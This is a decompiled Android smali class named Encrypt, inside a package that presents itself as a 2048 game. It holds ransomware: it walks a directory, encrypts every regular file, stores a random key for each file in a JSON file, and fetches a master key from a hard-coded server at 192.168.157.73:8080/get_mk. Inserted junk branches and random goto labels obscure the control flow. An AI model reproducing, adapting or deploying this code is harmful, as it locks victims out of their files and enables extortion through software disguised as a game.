.class public Laarkay/a2048game/Encrypt;
.super Ljava/lang/Object;
.source "Encrypt.java"
# direct methods
.method public constructor <init>()V
    .locals 0
    .line 36
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static encrypt(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

	const v0, 22
	const v1, 5
	add-int v0, v0, v1

    if-eq v0, v1, :neverHit

	rem-int v0, v0, v1

	if-gtz v0, :label_tmp
	goto/32 :label_end
	:label_tmp
	:label_start
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;,
            Lorg/json/JSONException;,
            Lorg/json/simple/parser/ParseException;
        }
    .end annotation
    const-string v0, "/"
    const-string v1, "_"
    .line 171
    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    move-result-object v0
    const-string v1, "jsonKEY"
    .line 172
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 175
    new-instance v1, Ljava/lang/String;
    invoke-direct {v1}, Ljava/lang/String;-><init>()V
    const/4 v2, 0x2
    const/4 v3, 0x1
    const/4 v4, 0x4
    const/4 v5, 0x3
    if-ne p0, v3, :cond_0
    const/16 p3, 0x10
    .line 177
    invoke-static {p3}, Laarkay/a2048game/Encrypt;->getAlphaNumericString(I)Ljava/lang/String;
    move-result-object p3
    goto :goto_0
    :cond_0
    if-ne p0, v2, :cond_2
    .line 182
    new-instance p3, Lorg/json/simple/parser/JSONParser;
    invoke-direct {p3}, Lorg/json/simple/parser/JSONParser;-><init>()V
    .line 183
    new-instance v1, Ljava/io/FileReader;
    invoke-direct {v1, p2}, Ljava/io/FileReader;-><init>(Ljava/lang/String;)V
    invoke-virtual {p3, v1}, Lorg/json/simple/parser/JSONParser;->parse(Ljava/io/Reader;)Ljava/lang/Object;
    move-result-object p3
    .line 184
    check-cast p3, Lorg/json/simple/JSONObject;
    .line 185
    invoke-virtual {p3, v0}, Lorg/json/simple/JSONObject;->get(Ljava/lang/Object;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Ljava/lang/String;
    const-string v6, "KEY FOUND:"
    .line 186
    invoke-static {v6, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 187
    invoke-virtual {p3}, Lorg/json/simple/JSONObject;->toJSONString()Ljava/lang/String;
    move-result-object p3
    const-string v6, "JSONOBJECT KEY"
    invoke-static {v6, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :cond_1
    move-object p3, v1
    goto :goto_0
    :cond_2
    if-eq p0, v5, :cond_3
    if-ne p0, v4, :cond_1
    :cond_3
    if-ne p0, v5, :cond_4
    const-string v1, "[3] MASTERKEY FOUND"
    .line 194
    invoke-static {v1, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    goto :goto_0
    :cond_4
    if-ne p0, v4, :cond_1
    const-string v1, "[4] MASTERKEY FOUND"
    .line 198
    invoke-static {v1, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 202
    :goto_0
    new-instance v1, Ljava/io/File;
    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    .line 203
    new-instance v6, Ljava/io/File;
    invoke-direct {v6, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    .line 204
    new-instance v7, Ljava/io/File;
    invoke-direct {v7, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    if-ne p0, v3, :cond_5
    .line 211
    :try_start_0
    new-instance p0, Landroid/util/Pair;
    invoke-direct {p0, v0, p3}, Landroid/util/Pair;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V
    .line 213
    new-instance p1, Lcom/google/gson/Gson;
    invoke-direct {p1}, Lcom/google/gson/Gson;-><init>()V
    .line 215
    new-instance v0, Ljava/io/FileReader;
    invoke-direct {v0, p2}, Ljava/io/FileReader;-><init>(Ljava/lang/String;)V
    .line 217
    const-class v2, Ljava/util/Map;
    invoke-virtual {p1, v0, v2}, Lcom/google/gson/Gson;->fromJson(Ljava/io/Reader;Ljava/lang/Class;)Ljava/lang/Object;
    move-result-object v2
    check-cast v2, Ljava/util/Map;
    .line 218
    iget-object v3, p0, Landroid/util/Pair;->first:Ljava/lang/Object;
    check-cast v3, Ljava/lang/String;
    iget-object p0, p0, Landroid/util/Pair;->second:Ljava/lang/Object;
    check-cast p0, Ljava/lang/String;
    invoke-interface {v2, v3, p0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    .line 220
    new-instance p0, Ljava/io/FileWriter;
    invoke-direct {p0, p2}, Ljava/io/FileWriter;-><init>(Ljava/lang/String;)V
    .line 221
    invoke-virtual {p1, v2, p0}, Lcom/google/gson/Gson;->toJson(Ljava/lang/Object;Ljava/lang/Appendable;)V
    .line 222
    invoke-virtual {p0}, Ljava/io/FileWriter;->close()V
    .line 223
    invoke-virtual {v0}, Ljava/io/FileReader;->close()V
    .line 224
    invoke-static {p3, v1, v6}, Laarkay/a2048game/Locker;->encrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    goto :goto_2
    :catch_0
    move-exception p0
    goto :goto_1
    :cond_5
    if-ne p0, v2, :cond_6
    .line 227
    invoke-static {p3, v6, v7}, Laarkay/a2048game/Locker;->decrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    goto :goto_2
    :cond_6
    if-eq p0, v5, :cond_7
    if-ne p0, v4, :cond_9
    :cond_7
    const-string p2, " with key: "
    if-ne p0, v5, :cond_8
    :try_start_1
    const-string p0, "MASTER ENCRYPTING FILE"
    .line 232
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p1
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 233
    invoke-static {p3, v6, v7}, Laarkay/a2048game/Locker;->encrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    goto :goto_2
    :cond_8
    if-ne p0, v4, :cond_9
    const-string p0, "MASTER DECRYPTING FILE"
    .line 236
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p1
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 237
    invoke-static {p3, v6, v7}, Laarkay/a2048game/Locker;->decrypt(Ljava/lang/String;Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    goto :goto_2
    .line 241
    :goto_1
    sget-object p1, Ljava/lang/System;->out:Ljava/io/PrintStream;
    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    move-result-object p2
    invoke-virtual {p1, p2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    .line 242
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V
    :cond_9
    :goto_2
    return-void
	:label_end
	goto/32 :label_start

    :neverHit
    goto/32 :loopA
    :loopA
    goto/32 :loopB
    :loopB
    goto/32 :neverHit
.end method
.method private static getAlphaNumericString(I)Ljava/lang/String;
    .locals 4

	const v0, 13
	const v1, 4
	add-int v0, v0, v1
	rem-int v0, v0, v1
	if-gtz v0, :UTAbZCXVdEsPHbRI
	goto/32 :BcNfeoOempfDjNKj
	:UTAbZCXVdEsPHbRI
	:dEHSVgGWQXlKQgCs
    const/16 v0, 0x100
    new-array v0, v0, [B
    .line 250
    new-instance v1, Ljava/util/Random;
    invoke-direct {v1}, Ljava/util/Random;-><init>()V
    invoke-virtual {v1, v0}, Ljava/util/Random;->nextBytes([B)V
    .line 252
    new-instance v1, Ljava/lang/String;
    const-string v2, "UTF-8"
    .line 253
    invoke-static {v2}, Ljava/nio/charset/Charset;->forName(Ljava/lang/String;)Ljava/nio/charset/Charset;
    move-result-object v2
    invoke-direct {v1, v0, v2}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    .line 256
    new-instance v0, Ljava/lang/StringBuffer;
    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V
    const-string v2, "[^A-Za-z0-9]"
    const-string v3, ""
    .line 261
    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    const/4 v2, 0x0
    .line 265
    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I
    move-result v3
    if-ge v2, v3, :cond_3
    .line 267
    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C
    move-result v3
    invoke-static {v3}, Ljava/lang/Character;->isLetter(C)Z
    move-result v3
    if-eqz v3, :cond_0
    if-gtz p0, :cond_1
    .line 269
    :cond_0
    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C
    move-result v3
    invoke-static {v3}, Ljava/lang/Character;->isDigit(C)Z
    move-result v3
    if-eqz v3, :cond_2
    if-lez p0, :cond_2
    .line 272
    :cond_1
    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C
    move-result v3
    invoke-virtual {v0, v3}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;
    add-int/lit8 p0, p0, -0x1
    :cond_2
    add-int/lit8 v2, v2, 0x1
    goto :goto_0
    .line 278
    :cond_3
    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
    move-result-object p0
    return-object p0
	:BcNfeoOempfDjNKj
	goto/32 :dEHSVgGWQXlKQgCs
.end method
.method public static init(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation
    const/4 v0, 0x0
    new-array v0, v0, [Ljava/lang/String;
    .line 41
    invoke-static {p1, v0}, Ljava/nio/file/Paths;->get(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;
    move-result-object p1
    .line 42
    invoke-static {p1}, Laarkay/a2048game/Encrypt;->listFiles(Ljava/nio/file/Path;)Ljava/util/List;
    move-result-object p1
    const/4 v0, 0x1
    if-ne p0, v0, :cond_0
    .line 47
    new-instance p3, Lcom/loopj/android/http/AsyncHttpClient;
    invoke-direct {p3}, Lcom/loopj/android/http/AsyncHttpClient;-><init>()V
    .line 48
    new-instance v0, Laarkay/a2048game/Encrypt$1;
    invoke-direct {v0, p2, p1, p0}, Laarkay/a2048game/Encrypt$1;-><init>(Ljava/lang/String;Ljava/util/List;I)V
    const-string p0, "http://192.168.157.73:8080/get_mk"
    invoke-virtual {p3, p0, v0}, Lcom/loopj/android/http/AsyncHttpClient;->get(Ljava/lang/String;Lcom/loopj/android/http/ResponseHandlerInterface;)Lcom/loopj/android/http/RequestHandle;
    goto :goto_0
    :cond_0
    const/4 v0, 0x2
    if-ne p0, v0, :cond_1
    .line 136
    new-instance p3, Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda0;
    invoke-direct {p3, p0, p2}, Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda0;-><init>(ILjava/lang/String;)V
    invoke-interface {p1, p3}, Ljava/util/List;->forEach(Ljava/util/function/Consumer;)V
    goto :goto_0
    :cond_1
    const/4 p1, 0x4
    if-ne p0, p1, :cond_2
    :try_start_0
    const-string p1, "MASTER DECRYPTING"
    .line 154
    invoke-static {p1, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    .line 155
    invoke-static {p0, p2, p2, p3}, Laarkay/a2048game/Encrypt;->encrypt(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/simple/parser/ParseException; {:try_start_0 .. :try_end_0} :catch_0
    goto :goto_0
    :catch_0
    move-exception p0
    .line 161
    invoke-virtual {p0}, Lorg/json/simple/parser/ParseException;->printStackTrace()V
    goto :goto_0
    :catch_1
    move-exception p0
    .line 159
    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V
    goto :goto_0
    :catch_2
    move-exception p0
    .line 157
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V
    :cond_2
    :goto_0
    return-void
.end method
.method static synthetic lambda$init$0(ILjava/lang/String;Ljava/nio/file/Path;)V
    .locals 2

	const v0, 7
	const v1, 27
	add-int v0, v0, v1
	rem-int v0, v0, v1
	if-gtz v0, :rcLbqBzqHiKHtZoo
	goto/32 :HoPwbgvVkGEziKat
	:rcLbqBzqHiKHtZoo
	:LhnpFAaaxLPIGhLK
    .line 138
    :try_start_0
    invoke-interface {p2}, Ljava/nio/file/Path;->toString()Ljava/lang/String;
    move-result-object v0
    const-string v1, ""
    invoke-static {p0, v0, p1, v1}, Laarkay/a2048game/Encrypt;->encrypt(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    const-string p0, "FP"
    .line 139
    invoke-interface {p2}, Ljava/nio/file/Path;->toString()Ljava/lang/String;
    move-result-object p1
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/simple/parser/ParseException; {:try_start_0 .. :try_end_0} :catch_0
    goto :goto_0
    :catch_0
    move-exception p0
    .line 145
    invoke-virtual {p0}, Lorg/json/simple/parser/ParseException;->printStackTrace()V
    goto :goto_0
    :catch_1
    move-exception p0
    .line 143
    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V
    goto :goto_0
    :catch_2
    move-exception p0
    .line 141
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V
    :goto_0
    return-void
	:HoPwbgvVkGEziKat
	goto/32 :LhnpFAaaxLPIGhLK
.end method
.method static synthetic lambda$listFiles$1(Ljava/nio/file/Path;)Z
    .locals 1
    const/4 v0, 0x0
    new-array v0, v0, [Ljava/nio/file/LinkOption;
    .line 285
    invoke-static {p0, v0}, Ljava/nio/file/Files;->isRegularFile(Ljava/nio/file/Path;[Ljava/nio/file/LinkOption;)Z
    move-result p0
    return p0
.end method
.method private static listFiles(Ljava/nio/file/Path;)Ljava/util/List;
    .locals 2

	const v0, 3
	const v1, 9
	add-int v0, v0, v1
	rem-int v0, v0, v1
	if-gtz v0, :HIkEaxLeRQhsRluP
	goto/32 :jouXFsEZnXkpZbda
	:HIkEaxLeRQhsRluP
	:panxsZyXRtAZcgub
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/nio/file/Path;",
            ")",
            "Ljava/util/List<",
            "Ljava/nio/file/Path;",
            ">;"
        }
    .end annotation
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation
    const/4 v0, 0x0
    new-array v0, v0, [Ljava/nio/file/FileVisitOption;
    .line 284
    invoke-static {p0, v0}, Ljava/nio/file/Files;->walk(Ljava/nio/file/Path;[Ljava/nio/file/FileVisitOption;)Ljava/util/stream/Stream;
    move-result-object p0
    .line 285
    :try_start_0
    sget-object v0, Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda1;->INSTANCE:Laarkay/a2048game/Encrypt$$ExternalSyntheticLambda1;
    invoke-interface {p0, v0}, Ljava/util/stream/Stream;->filter(Ljava/util/function/Predicate;)Ljava/util/stream/Stream;
    move-result-object v0
    invoke-static {}, Ljava/util/stream/Collectors;->toList()Ljava/util/stream/Collector;
    move-result-object v1
    invoke-interface {v0, v1}, Ljava/util/stream/Stream;->collect(Ljava/util/stream/Collector;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Ljava/util/List;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    if-eqz p0, :cond_0
    .line 286
    invoke-interface {p0}, Ljava/util/stream/Stream;->close()V
    :cond_0
    return-object v0
    :catchall_0
    move-exception v0
    if-eqz p0, :cond_1
    .line 284
    :try_start_1
    invoke-interface {p0}, Ljava/util/stream/Stream;->close()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1
    goto :goto_0
    :catchall_1
    move-exception p0
    invoke-virtual {v0, p0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :cond_1
    :goto_0
    throw v0
	:jouXFsEZnXkpZbda
	goto/32 :panxsZyXRtAZcgub
.end method
